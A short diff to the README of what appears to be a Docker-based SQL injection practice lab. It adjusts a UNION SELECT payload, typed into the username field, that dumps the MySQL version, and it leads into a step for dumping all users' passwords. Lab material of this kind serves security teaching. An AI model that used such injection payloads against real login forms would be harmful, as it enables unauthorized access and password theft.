@@ -37,7 +37,7 @@ Clean the Docker environment (after making changes):
     - `password`: `anythingyouwant`
 
 3. Dump MySQL version:
-    - `username`: `' UNION SELECT null,@@version#`
+    - `username`: `' UNION SELECT NULL,NULL,NULL,@@version#`
     - `password`: `anythingyouwant`
 
 4. Dump all users passwords:
